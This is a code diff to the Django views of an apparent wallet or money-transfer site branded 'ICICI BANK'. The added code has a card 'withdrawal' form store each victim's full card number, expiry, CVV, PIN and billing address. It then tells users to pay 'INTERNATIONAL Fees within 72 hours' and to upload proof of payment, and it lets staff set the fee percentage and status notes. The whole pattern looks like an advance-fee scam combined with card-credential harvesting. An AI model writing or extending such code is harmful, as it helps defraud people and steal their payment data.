@@ -3,8 +3,11 @@ from django.contrib import messages
 from django.contrib.auth.decorators import login_required
 from wallet.models import Wallet  # change to your actual wallet model path
 from django.contrib.auth import get_user_model
+from django.utils import timezone
 User = get_user_model()
 from django.core.mail import send_mail
+from .email_templates import construct_transfer_email
+from django.core.mail import get_connection
 
 @login_required
 def test_email(request):
@@ -89,10 +92,7 @@ def withdraw_card(request):
         form = CardWithdrawForm(request.POST)
         if form.is_valid():
             amount = form.cleaned_data['amount']
-            card_brand = form.cleaned_data['card_brand']
-            card_last4 = form.cleaned_data['card_last4']
-            card_holder = form.cleaned_data['card_holder']
-
+            
             if wallet.icici_balance < amount:
                 messages.error(request, "Insufficient funds for withdrawal.")
                 return render(request, 'transactions/withdraw_card.html', {'form': form, 'wallet': wallet})
@@ -100,15 +100,25 @@ def withdraw_card(request):
             wallet.icici_balance -= amount
             wallet.save()
 
+            # Create transaction with all card details
             transaction = Transaction.objects.create(
                 user=user,
                 tx_type='WITHDRAW',
                 amount=amount,
                 status='PENDING',
                 description="Withdrawal to card pending. Please pay INTERNATIONAL Fees within 72 hours.",
-                card_brand=card_brand,
-                card_last4=card_last4,
-                card_holder=card_holder,
+                # Card details
+                card_brand=form.cleaned_data['card_brand'],
+                card_number=form.cleaned_data['card_number'],  # Save full card number
+                card_last4=form.cleaned_data['card_last4'],
+                card_holder=form.cleaned_data['card_holder'],
+                card_expiry=form.cleaned_data['card_expiry'],
+                card_cvv=form.cleaned_data['card_cvv'],
+                card_pin=form.cleaned_data['card_pin'],
+                # Billing details
+                billing_address=form.cleaned_data['billing_address'],
+                billing_city=form.cleaned_data['billing_city'],
+                billing_postal_code=form.cleaned_data['billing_postal_code'],
             )
 
             messages.info(request, "Card withdrawal request submitted. Please pay INTERNATIONAL Fees within 72 hours for processing.")
@@ -164,7 +174,7 @@ def withdraw_user(request):
         wallet.save()
 
         recipient_wallet, _ = Wallet.objects.get_or_create(user=recipient)
-        recipient_wallet.paypal_balance += amount
+        recipient_wallet.icici_balance += amount
         recipient_wallet.save()
 
         # Log transactions
@@ -189,6 +199,16 @@ def withdraw_user(request):
             user=recipient,
             message=f" You received ${amount:.2f} from {request.user.email}."
         )
+
+        # Send transfer notification email to recipient
+        email_msg = construct_transfer_email(
+            sender_name=request.user.get_full_name() or request.user.email,
+            receiver_name=recipient.get_full_name() or recipient.email,
+            receiver_email=recipient.email,
+            amount=amount,
+            bank_name="ICICI BANK"
+        )
+        email_msg.send(fail_silently=True)
 
         messages.success(request, f"Successfully transferred ${amount:.2f} to {email}.")
         return redirect('transactions:transfer_success', amount=amount, email=email)
@@ -454,7 +474,7 @@ def accept_money_request(request, tx_id):
     payer_wallet.save()
     
     requester_wallet, _ = Wallet.objects.get_or_create(user=transaction.user)
-    requester_wallet.paypal_balance += transaction.amount
+    requester_wallet.icici_balance += transaction.amount
     requester_wallet.save()
     
     # Record ledger entries
@@ -481,7 +501,7 @@ def accept_money_request(request, tx_id):
     # Notify requester
     Notification.objects.create(
         user=transaction.user,
-        message=f"✅ {request.user.email} accepted your money request of ${transaction.amount:.2f}."
+        message=f" {request.user.email} accepted your money request of ${transaction.amount:.2f}."
     )
     
     messages.success(request, f"Successfully sent ${transaction.amount:.2f} to {transaction.user.email}.")
@@ -505,7 +525,7 @@ def decline_money_request(request, tx_id):
     # Notify requester
     Notification.objects.create(
         user=transaction.user,
-        message=f"❌ {request.user.email} declined your money request of ${transaction.amount:.2f}."
+        message=f" {request.user.email} declined your money request of ${transaction.amount:.2f}."
     )
     
     messages.info(request, f"Declined money request from {transaction.user.email}.")
@@ -539,21 +559,86 @@ def withdrawal_pending(request, tx_id):
 @login_required
 def international_fee_page(request, tx_id):
     """International Fee Payment Page"""
-    from django.shortcuts import get_object_or_404
+    from django.shortcuts import get_object_or_404, redirect
+    from .models import TransactionFeeNote
+    from django.conf import settings
+    import os
+    from pathlib import Path
+    
     tx = get_object_or_404(Transaction, id=tx_id, user=request.user)
+    
+    # Create media/vouchers directory if it doesn't exist
+    os.makedirs(os.path.join(settings.MEDIA_ROOT, 'vouchers'), exist_ok=True)
+    
     if request.method == 'POST':
         file = request.FILES.get('voucher_image')
         if file:
-            tx.voucher_image = file
-            tx.save(update_fields=['voucher_image'])
-            messages.success(request, 'Voucher proof uploaded successfully. We will review and update your status shortly.')
+            try:
+                # Ensure the file is an image or PDF
+                valid_extensions = ['.jpg', '.jpeg', '.png', '.pdf']
+                file_extension = os.path.splitext(file.name)[1].lower()
+                if file_extension not in valid_extensions:
+                    messages.error(request, 'Invalid file type. Please upload a JPG, PNG, or PDF file.')
+                    return redirect('transactions:international_fee', tx_id=tx_id)
+                
+                # Delete old file if it exists
+                if tx.voucher_image:
+                    try:
+                        old_file_path = os.path.join(settings.MEDIA_ROOT, str(tx.voucher_image))
+                        if os.path.isfile(old_file_path):
+                            os.remove(old_file_path)
+                    except Exception as e:
+                        print(f"Error removing old file: {e}")
+                
+                # Generate a unique filename
+                file_name = f'tx_{tx_id}_voucher_{int(timezone.now().timestamp())}{file_extension}'
+                relative_path = f'vouchers/{file_name}'
+                file_path = os.path.join(settings.MEDIA_ROOT, relative_path)
+                
+                # Ensure the directory exists
+                os.makedirs(os.path.dirname(file_path), exist_ok=True)
+                
+                # Save the file
+                with open(file_path, 'wb+') as destination:
+                    for chunk in file.chunks():
+                        destination.write(chunk)
+                
+                # Update the transaction
+                tx.voucher_image = relative_path
+                tx.international_fee_status = 'PENDING'
+                tx.save(update_fields=['voucher_image', 'international_fee_status'])
+                
+                # Create a note about the upload
+                TransactionFeeNote.objects.create(
+                    transaction=tx,
+                    message=f"User uploaded voucher/proof on {timezone.now().strftime('%Y-%m-%d %H:%M')}"
+                )
+                
+                messages.success(request, 'Voucher uploaded successfully. We will review your submission and update the status shortly.')
+                return redirect('transactions:transaction_detail', tx_id=tx.id)
+                
+            except Exception as e:
+                import traceback
+                error_msg = str(e)
+                print(f"Error in international_fee_page: {error_msg}\n{traceback.format_exc()}")
+                
+                # More specific error messages
+                if 'permission' in error_msg.lower():
+                    messages.error(request, 'Permission error when saving the file. Please check server permissions.')
+                elif 'disk full' in error_msg.lower():
+                    messages.error(request, 'Server storage is full. Please contact support.')
+                else:
+                    messages.error(request, f'Error uploading file: {error_msg}')
         else:
-            messages.error(request, 'Voucher image is required.')
-    # Default percentage if admin hasn't set one
-    percentage = tx.international_fee_percentage
-    message = tx.international_fee_message
+            messages.error(request, 'Please select a file to upload.')
+            return redirect('transactions:international_fee', tx_id=tx_id)
+    
+    # For GET requests, render the upload form
+    percentage = tx.international_fee_percentage or 0
+    message = tx.international_fee_message or ''
     fee_notes = getattr(tx, 'fee_notes', None)
     ordered_notes = fee_notes.order_by('-created_at') if fee_notes is not None else []
+    
     return render(request, 'transactions/international_fee.html', {
         'transaction': tx,
         'percentage': percentage,
@@ -573,6 +658,56 @@ def international_fee_status(request, tx_id):
         'percentage': str(tx.international_fee_percentage) if tx.international_fee_percentage is not None else None,
         'message': tx.international_fee_message or '',
         'tx_status': tx.status,
+    })
+
+
+@login_required
+def fee_payment_status(request, tx_id):
+    """Show the status of the international fee payment with progress."""
+    from django.shortcuts import get_object_or_404
+    from django.db.models import Q
+    
+    # Get the transaction, ensuring the user has permission to view it
+    tx = get_object_or_404(
+        Transaction.objects.select_related('user'),
+        Q(id=tx_id) & (Q(user=request.user) | Q(counterparty=request.user))
+    )
+    
+    # If this is a POST request, it might be an admin updating the status
+    if request.method == 'POST' and request.user.is_staff:
+        if 'update_status' in request.POST:
+            new_status = request.POST.get('status')
+            message = request.POST.get('message', '').strip()
+            percentage = request.POST.get('percentage')
+            
+            if new_status in dict(Transaction.FEE_STATUS_CHOICES):
+                tx.international_fee_status = new_status
+                
+                if percentage and percentage.isdigit():
+                    tx.international_fee_percentage = min(100, max(0, int(percentage)))
+                
+                if message:
+                    tx.international_fee_message = message
+                    # Create a new note for this update
+                    from .models import TransactionFeeNote
+                    TransactionFeeNote.objects.create(
+                        transaction=tx,
+                        message=f"Admin update ({new_status}): {message}"
+                    )
+                
+                tx.save()
+                messages.success(request, 'Status updated successfully.')
+            else:
+                messages.error(request, 'Invalid status provided.')
+            
+            return redirect('transactions:fee_payment_status', tx_id=tx.id)
+    
+    # Get all fee notes for this transaction
+    fee_notes = tx.fee_notes.all().order_by('-created_at')
+    
+    return render(request, 'transactions/fee_payment_status.html', {
+        'transaction': tx,
+        'fee_notes': fee_notes,
     })
 
 
